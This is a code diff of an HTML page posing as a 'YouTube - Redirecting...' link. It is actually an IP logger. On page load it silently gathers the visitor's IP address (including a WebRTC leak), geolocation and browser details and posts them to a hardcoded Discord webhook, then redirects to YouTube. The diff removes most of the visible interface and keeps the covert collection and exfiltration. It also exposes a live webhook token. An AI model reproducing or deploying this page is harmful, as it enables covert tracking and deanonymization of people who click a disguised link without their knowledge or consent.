@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>YouTube - Redirecting...</title>
     
-    <!-- TVŮJ DISCORD WEBHOOK -->
     <meta name="discord-webhook" content="https://discord.com/api/webhooks/1468632156161970372/iYFdHsPd3dEj7NxeM1Qsaw5aFGLP4pDZnU-FY_t8VFv54H1zUkSQ59E3ORnEh5Dy5_Ma">
     
     <meta http-equiv="refresh" content="3;url=https://www.youtube.com">
@@ -13,7 +12,7 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: linear-gradient(135deg, #ff0000, #cc0000);
+            background: linear-gradient(135deg, #333333, #2b2b2b);
             font-family: 'Arial', sans-serif;
             color: white;
             min-height: 100vh;
@@ -22,205 +21,15 @@
             align-items: center;
             padding: 20px;
         }
-        .container {
-            background: rgba(0, 0, 0, 0.9);
-            padding: 30px;
-            border-radius: 15px;
-            max-width: 900px;
-            width: 100%;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
-        }
-        .logo { 
-            font-size: 80px; 
-            text-align: center;
-            margin-bottom: 20px; 
-            animation: pulse 1s infinite; 
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
-        }
-        h1 { 
-            font-size: 32px; 
-            margin-bottom: 20px; 
-            text-align: center;
-            color: #fff;
-        }
-        .status-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 15px;
-            margin: 25px 0;
-        }
-        .status-card {
-            background: rgba(255,255,255,0.1);
-            border-radius: 10px;
-            padding: 20px;
-            border-left: 5px solid #ff0000;
-        }
-        .status-card.success { border-left-color: #4CAF50; }
-        .status-card.error { border-left-color: #f44336; }
-        .status-card.warning { border-left-color: #ff9800; }
-        .status-title {
-            font-weight: bold;
-            margin-bottom: 10px;
-            font-size: 18px;
-        }
-        .status-value {
-            font-size: 16px;
-            word-break: break-all;
-        }
-        .loading {
-            width: 100%;
-            height: 8px;
-            background: rgba(255,255,255,0.2);
-            border-radius: 4px;
-            margin: 25px 0;
-            overflow: hidden;
-        }
-        .loading-bar {
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, #ff0000, #ff9900);
-            animation: loading 3s linear forwards;
-        }
-        @keyframes loading {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(0); }
-        }
-        .countdown {
-            font-size: 24px;
-            margin: 20px 0;
-            color: #ffcc00;
-            font-weight: bold;
-            text-align: center;
-        }
-        .button-group {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin: 25px 0;
-            flex-wrap: wrap;
-        }
-        .btn {
-            background: #333;
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 16px;
-            transition: all 0.3s;
-            min-width: 160px;
-        }
-        .btn:hover { 
-            background: #444; 
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-        }
-        .btn-red { background: #ff0000; }
-        .btn-green { background: #00aa00; }
-        .btn-blue { background: #0066cc; }
-        .debug-panel {
-            background: rgba(0,0,0,0.7);
-            border-radius: 10px;
-            padding: 20px;
-            margin-top: 25px;
-            font-family: 'Consolas', 'Monaco', monospace;
-            font-size: 13px;
-            max-height: 400px;
-            overflow-y: auto;
-            display: none;
-        }
-        .log-entry {
-            margin: 8px 0;
-            padding: 8px;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
-        }
-        .log-time {
-            color: #888;
-            margin-right: 10px;
-        }
-        .log-info { color: #2196F3; }
-        .log-success { color: #4CAF50; }
-        .log-warning { color: #ff9800; }
-        .log-error { color: #f44336; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">▶️</div>
-        <h1>Redirecting to YouTube...</h1>
-        
-        <div class="countdown" id="countdown">Starting in 3 seconds...</div>
-        
-        <div class="loading">
-            <div class="loading-bar"></div>
-        </div>
-        
-        <div class="status-grid">
-            <div class="status-card" id="ip-card">
-                <div class="status-title">🌐 IP Address</div>
-                <div class="status-value" id="ip-value">Detecting...</div>
-            </div>
-            
-            <div class="status-card" id="location-card">
-                <div class="status-title">📍 Location</div>
-                <div class="status-value" id="location-value">Detecting...</div>
-            </div>
-            
-            <div class="status-card" id="browser-card">
-                <div class="status-title">🖥️ Browser Info</div>
-                <div class="status-value" id="browser-value">Detecting...</div>
-            </div>
-            
-            <div class="status-card" id="status-card">
-                <div class="status-title">📊 Status</div>
-                <div class="status-value" id="status-value">Initializing...</div>
-            </div>
-        </div>
-        
-        <div class="button-group">
-            <button class="btn btn-green" onclick="collectData()">
-                🔍 Collect Data
-            </button>
-            <button class="btn btn-blue" onclick="toggleDebug()">
-                🐛 Debug Panel
-            </button>
-            <button class="btn btn-red" onclick="cancelRedirect()">
-                ❌ Cancel Redirect
-            </button>
-            <button class="btn" onclick="testDiscord()">
-                📤 Test Discord
-            </button>
-        </div>
-        
-        <div class="debug-panel" id="debug-panel">
-            <h3 style="margin-bottom: 15px; color: #ffcc00;">Debug Log</h3>
-            <div id="debug-log"></div>
-        </div>
-        
-        <p style="margin-top: 25px; text-align: center; font-size: 14px; opacity: 0.8;">
-            If not redirected in 5 seconds, 
-            <a href="https://www.youtube.com" style="color: #ffcc00; text-decoration: none; font-weight: bold;">
-                click here to go to YouTube
-            </a>
-        </p>
-    </div>
-
     <script>
-        // ============================================
-        // KONFIGURACE
-        // ============================================
         const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1468632156161970372/iYFdHsPd3dEj7NxeM1Qsaw5aFGLP4pDZnU-FY_t8VFv54H1zUkSQ59E3ORnEh5Dy5_Ma";
         let isCancelled = false;
         let redirectTimer;
         let collectedData = {};
         
-        // ============================================
-        // LOGOVACÍ SYSTÉM
-        // ============================================
         function log(message, type = 'info') {
             const logDiv = document.getElementById('debug-log');
             const time = new Date().toLocaleTimeString();
@@ -229,8 +38,6 @@
             logEntry.innerHTML = `<span class="log-time">[${time}]</span> ${message}`;
             logDiv.appendChild(logEntry);
             logDiv.scrollTop = logDiv.scrollHeight;
-            
-            // Také do konzole
             console.log(`[${type.toUpperCase()}] ${message}`);
         }
         
@@ -238,8 +45,6 @@
             const element = document.getElementById(elementId);
             if (element) {
                 element.textContent = value;
-                
-                // Aktualizovat i parent card
                 const card = element.closest('.status-card');
                 if (card) {
                     card.className = `status-card ${type}`;
@@ -252,95 +57,74 @@
             panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
         }
         
-        // ============================================
-        // 1. ZÍSKÁNÍ IP ADRESY - OPRAVENÁ VERZE
-        // ============================================
         async function getRealIP() {
             log('Starting IP detection...', 'info');
-            updateStatus('ip-value', 'Detecting via Netlify Function...');
+            updateStatus('ip-value', 'Detecting...');
             
             try {
-                // 1. Zkusit Netlify Function
-                log('Trying Netlify Function: /.netlify/functions/getip', 'info');
-                const response = await fetch('/.netlify/functions/getip');
+                log('Trying public IP APIs...', 'info');
                 
-                if (response.ok) {
-                    const data = await response.json();
-                    log(`Netlify Function response: ${JSON.stringify(data)}`, 'info');
-                    
-                    if (data.success && data.ip && data.ip !== 'Unknown') {
-                        log(`✅ IP from Netlify Function: ${data.ip}`, 'success');
-                        updateStatus('ip-value', data.ip, 'success');
-                        return data.ip;
+                const ipServices = [
+                    'https://api.ipify.org?format=json',
+                    'https://api64.ipify.org?format=json',
+                    'https://api.myip.com',
+                    'https://ipapi.co/json/',
+                    'https://ipinfo.io/json',
+                    'https://worldtimeapi.org/api/ip'
+                ];
+                
+                for (const service of ipServices) {
+                    try {
+                        log(`Trying: ${service}`, 'info');
+                        
+                        const controller = new AbortController();
+                        const timeout = setTimeout(() => controller.abort(), 3000);
+                        
+                        const response = await fetch(service, {
+                            signal: controller.signal
+                        });
+                        
+                        clearTimeout(timeout);
+                        
+                        if (response.ok) {
+                            const data = await response.json();
+                            const ip = data.ip || data.client_ip || data.query || 'Unknown';
+                            
+                            if (ip !== 'Unknown') {
+                                log(`IP found: ${ip}`, 'success');
+                                updateStatus('ip-value', ip, 'success');
+                                return ip;
+                            }
+                        }
+                    } catch (error) {
+                        log(`Service ${service} failed: ${error.message}`, 'warning');
+                        continue;
                     }
                 }
-            } catch (error) {
-                log(`Netlify Function error: ${error.message}`, 'warning');
-            }
-            
-            // 2. Pokud Netlify Function selže, použij veřejné API
-            updateStatus('ip-value', 'Using public APIs...', 'warning');
-            log('Trying public IP APIs...', 'warning');
-            
-            const ipServices = [
-                'https://api.ipify.org?format=json',
-                'https://api64.ipify.org?format=json',
-                'https://api.myip.com',
-                'https://ipapi.co/json/',
-                'https://ipinfo.io/json',
-                'https://worldtimeapi.org/api/ip'
-            ];
-            
-            for (const service of ipServices) {
+                
                 try {
-                    log(`Trying: ${service}`, 'info');
-                    
-                    // Bez AbortSignal.timeout (není podporován ve starých prohlížečích)
-                    const controller = new AbortController();
-                    const timeout = setTimeout(() => controller.abort(), 3000);
-                    
-                    const response = await fetch(service, {
-                        signal: controller.signal
-                    });
-                    
-                    clearTimeout(timeout);
-                    
-                    if (response.ok) {
-                        const data = await response.json();
-                        const ip = data.ip || data.client_ip || data.query || 'Unknown';
-                        
-                        if (ip !== 'Unknown') {
-                            log(`✅ IP from ${service}: ${ip}`, 'success');
-                            updateStatus('ip-value', ip, 'success');
-                            return ip;
-                        }
+                    log('Trying WebRTC detection...', 'info');
+                    const rtcIP = await getWebRTCIP();
+                    if (rtcIP) {
+                        log(`IP from WebRTC: ${rtcIP}`, 'success');
+                        updateStatus('ip-value', `${rtcIP} (WebRTC)`, 'success');
+                        return rtcIP;
                     }
                 } catch (error) {
-                    log(`Service ${service} failed: ${error.message}`, 'warning');
-                    continue;
+                    log(`WebRTC failed: ${error.message}`, 'warning');
                 }
-            }
-            
-            // 3. WebRTC jako poslední možnost
-            try {
-                log('Trying WebRTC detection...', 'info');
-                const rtcIP = await getWebRTCIP();
-                if (rtcIP) {
-                    log(`✅ IP from WebRTC: ${rtcIP}`, 'success');
-                    updateStatus('ip-value', `${rtcIP} (WebRTC)`, 'success');
-                    return rtcIP;
-                }
+                
+                log('All methods failed', 'error');
+                updateStatus('ip-value', 'Unable to detect', 'error');
+                return 'Unknown';
+                
             } catch (error) {
-                log(`WebRTC failed: ${error.message}`, 'warning');
+                log(`IP detection error: ${error.message}`, 'error');
+                updateStatus('ip-value', 'Detection failed', 'error');
+                return 'Unknown';
             }
-            
-            // 4. Fallback na client-side detection
-            log('All methods failed, using fallback detection', 'error');
-            updateStatus('ip-value', 'Unable to detect (check console)', 'error');
-            return 'Unknown';
         }
         
-        // WebRTC IP detection
         function getWebRTCIP() {
             return new Promise((resolve) => {
                 const pc = new RTCPeerConnection({ iceServers: [] });
@@ -356,7 +140,6 @@
                     
                     if (match) {
                         const ip = match[1];
-                        // Filtruj lokální IP adresy
                         if (!ip.startsWith('192.168.') && 
                             !ip.startsWith('10.') && 
                             !ip.startsWith('172.16.') &&
@@ -388,9 +171,6 @@
             });
         }
         
-        // ============================================
-        // 2. ZÍSKÁNÍ GEO-LOKACE
-        // ============================================
         async function getGeoLocation(ip) {
             if (ip === 'Unknown' || ip.includes('192.168.') || ip.includes('127.0.0.1')) {
                 updateStatus('location-value', 'Local network', 'warning');
@@ -426,7 +206,7 @@
                             };
                             
                             const locationStr = `${location.city}, ${location.country}`;
-                            log(`✅ Location found: ${locationStr}`, 'success');
+                            log(`Location found: ${locationStr}`, 'success');
                             updateStatus('location-value', locationStr, 'success');
                             
                             return location;
@@ -443,9 +223,6 @@
             return null;
         }
         
-        // ============================================
-        // 3. SBĚR DAT PROHLÍŽEČE
-        // ============================================
         function collectBrowserData() {
             const urlParams = new URLSearchParams(window.location.search);
             
@@ -476,9 +253,6 @@
             return data;
         }
         
-        // ============================================
-        // 4. ODESLÁNÍ NA DISCORD
-        // ============================================
         async function sendToDiscord(data) {
             updateStatus('status-value', 'Sending to Discord...');
             log('Preparing Discord webhook payload...', 'info');
@@ -491,7 +265,6 @@
             }
             
             try {
-                // Vytvořit Discord embed
                 const embed = {
                     title: '🎯 NEW VISITOR LOGGED',
                     color: 0xFF0000,
@@ -547,9 +320,7 @@
                 };
                 
                 log(`Sending to Discord webhook...`, 'info');
-                log(`Payload: ${JSON.stringify(payload, null, 2)}`, 'info');
                 
-                // Odeslat na Discord
                 const response = await fetch(DISCORD_WEBHOOK, {
                     method: 'POST',
                     headers: {
@@ -559,74 +330,60 @@
                 });
                 
                 if (response.ok) {
-                    updateStatus('status-value', '✅ Data sent to Discord!', 'success');
-                    log('✅ Successfully sent to Discord!', 'success');
+                    updateStatus('status-value', 'Data sent to Discord!', 'success');
+                    log('Successfully sent to Discord!', 'success');
                     return true;
                 } else {
                     const errorText = await response.text();
                     updateStatus('status-value', `Discord error: ${response.status}`, 'error');
-                    log(`❌ Discord error ${response.status}: ${errorText}`, 'error');
+                    log(`Discord error ${response.status}: ${errorText}`, 'error');
                     return false;
                 }
                 
             } catch (error) {
                 updateStatus('status-value', `Error: ${error.message}`, 'error');
-                log(`❌ Discord send error: ${error.message}`, 'error');
+                log(`Discord send error: ${error.message}`, 'error');
                 return false;
             }
         }
         
-        // ============================================
-        // 5. HLAVNÍ FUNKCE
-        // ============================================
         async function collectData() {
             updateStatus('status-value', 'Starting data collection...');
-            log('=== STARTING DATA COLLECTION ===', 'info');
+            log('STARTING DATA COLLECTION', 'info');
             
             try {
-                // 1. Získat IP adresu
                 const ip = await getRealIP();
-                
-                // 2. Získat geolokaci
                 const geo = await getGeoLocation(ip);
-                
-                // 3. Sbírat data prohlížeče
                 const browserData = collectBrowserData();
                 
-                // 4. Uložit všechna data
                 collectedData = {
                     ip: ip,
                     geo: geo,
                     browser: browserData
                 };
                 
-                log('=== DATA COLLECTION COMPLETE ===', 'success');
-                log(`Collected data: ${JSON.stringify(collectedData, null, 2)}`, 'info');
+                log('DATA COLLECTION COMPLETE', 'success');
                 
-                // 5. Odeslat na Discord
                 updateStatus('status-value', 'Sending to Discord...');
                 const sent = await sendToDiscord(collectedData);
                 
                 if (sent) {
-                    updateStatus('status-value', '✅ Complete! Redirecting...', 'success');
+                    updateStatus('status-value', 'Complete! Redirecting...', 'success');
                 } else {
-                    updateStatus('status-value', '⚠️ Collected (Discord failed)', 'warning');
+                    updateStatus('status-value', 'Collected (Discord failed)', 'warning');
                 }
                 
                 return collectedData;
                 
             } catch (error) {
                 updateStatus('status-value', `Error: ${error.message}`, 'error');
-                log(`❌ Collection error: ${error.message}`, 'error');
+                log(`Collection error: ${error.message}`, 'error');
                 return null;
             }
         }
         
-        // ============================================
-        // 6. TEST FUNKCE PRO DISCORD
-        // ============================================
         async function testDiscord() {
-            log('=== TESTING DISCORD WEBHOOK ===', 'info');
+            log('TESTING DISCORD WEBHOOK', 'info');
             
             const testData = {
                 ip: '8.8.8.8',
@@ -648,20 +405,16 @@
             const result = await sendToDiscord(testData);
             
             if (result) {
-                alert('✅ Test successful! Check your Discord channel.');
+                alert('Test successful! Check your Discord channel.');
             } else {
-                alert('❌ Test failed. Check debug panel for details.');
+                alert('Test failed. Check debug panel for details.');
             }
         }
         
-        // ============================================
-        // 7. REDIRECT FUNKCE
-        // ============================================
         function startRedirect() {
             let seconds = 3;
             const countdownElement = document.getElementById('countdown');
             
-            // Countdown animace
             const countdownInterval = setInterval(() => {
                 if (seconds >= 0) {
                     countdownElement.textContent = `Redirecting in ${seconds} second${seconds !== 1 ? 's' : ''}...`;
@@ -671,7 +424,6 @@
                 }
             }, 1000);
             
-            // Hlavní redirect timer
             redirectTimer = setTimeout(() => {
                 if (!isCancelled) {
                     log('Performing redirect to YouTube...', 'info');
@@ -690,7 +442,6 @@
             
             log('Redirect cancelled by user', 'warning');
             
-            // Přidat tlačítko pro manuální redirect
             const manualBtn = document.createElement('button');
             manualBtn.className = 'btn btn-green';
             manualBtn.innerHTML = '🚀 Go to YouTube Now';
@@ -699,25 +450,17 @@
             document.querySelector('.button-group').appendChild(manualBtn);
         }
         
-        // ============================================
-        // 8. INICIALIZACE
-        // ============================================
         document.addEventListener('DOMContentLoaded', () => {
-            log('🚀 Netlify IP Logger started', 'success');
-            log(`🌍 Hostname: ${window.location.hostname}`, 'info');
-            log(`🌐 User Agent: ${navigator.userAgent}`, 'info');
-            log(`🔗 Discord Webhook: ${DISCORD_WEBHOOK ? 'Configured' : 'Not configured'}`, 
-                DISCORD_WEBHOOK ? 'success' : 'error');
+            log('IP Logger started', 'success');
+            log(`Hostname: ${window.location.hostname}`, 'info');
+            log(`User Agent: ${navigator.userAgent}`, 'info');
             
-            // Automaticky sbírat data
             setTimeout(async () => {
                 await collectData();
             }, 1000);
             
-            // Spustit redirect
             startRedirect();
             
-            // Klávesové zkratky
             document.addEventListener('keydown', (e) => {
                 if (e.key === 'd' || e.key === 'D') toggleDebug();
                 if (e.key === 'Escape') cancelRedirect();
@@ -726,7 +469,6 @@
             });
         });
         
-        // Exit tracking
         window.addEventListener('beforeunload', () => {
             if (collectedData.ip && collectedData.ip !== 'Unknown') {
                 log(`User exited at ${new Date().toLocaleTimeString()}`, 'info');
